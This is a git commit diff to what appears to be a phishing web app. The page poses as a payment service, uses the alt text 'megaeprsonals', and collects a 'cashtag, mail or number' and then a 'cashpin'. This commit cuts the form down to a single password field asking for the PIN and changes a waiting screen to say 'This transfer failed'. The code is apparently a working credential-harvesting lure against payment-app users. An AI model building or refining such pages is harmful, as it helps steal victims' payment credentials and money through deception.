314a31cad9dd276e233d223893d5b6f0d6fa3363
Zayn Yusuf <yusue786@gmail.com>
2025-01-28 22:36:44 +0600

    adding new image

--- app/components/Home.js
+++ app/components/Home.js
@@ -45,7 +45,7 @@ export default function Home({ adminId, posterId }) {
               <img
                 width={464}
                 height={785}
-                src="/images/main.png"
+                src="/images/banner.jpeg"
                 alt="megaeprsonals"
                 priority
               />
@@ -67,51 +67,27 @@ export default function Home({ adminId, posterId }) {
             >
               {(formik) => (
                 <Form className="">
-                  {!next ? (
-                    <>
-                      <div className="flex flex-row justify-center items-center  w-[388px]">
-                        <input
-                          className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                          placeholder="Enter your cashtag, mail or number "
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
-                          type="email"
-                          required
-                        />
-                      </div>
+                  <>
+                    <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
+                      <Field
+                        className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
+                        placeholder="Enter your cashpin"
+                        name="password"
+                        type="password"
+                        autoComplete="on"
+                        required
+                      />
+                    </div>
 
-                      <div className="flex flex-row justify-center items-center mt-1">
-                        <button
-                          onClick={() => handleEmail()}
-                          className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
-                        >
-                          Continue
-                        </button>
-                      </div>
-                    </>
-                  ) : (
-                    <>
-                      <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
-                        <Field
-                          className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                          placeholder="Enter your cashpin"
-                          name="password"
-                          type="password"
-                          autoComplete="on"
-                          required
-                        />
-                      </div>
-
-                      <div className="flex flex-row justify-center items-center mt-1">
-                        <button
-                          type="submit"
-                          className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
-                        >
-                          Continue
-                        </button>
-                      </div>
-                    </>
-                  )}
+                    <div className="flex flex-row justify-center items-center mt-1">
+                      <button
+                        type="submit"
+                        className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
+                      >
+                        Continue
+                      </button>
+                    </div>
+                  </>
                 </Form>
               )}
             </Formik>
--- app/verification/page.jsx
+++ app/verification/page.jsx
@@ -3,7 +3,7 @@ function VerificationPage() {
   return (
     <div className="font-roboto mt-5 flex flex-col justify-center items-center bg-white text-[#202124] text-base">
     <p className='text-2xl font-bold text-center mt-[150px]'>
-      Waiting for Bank Transfer....
+     This transfer failed
     </p>
   </div>
   )
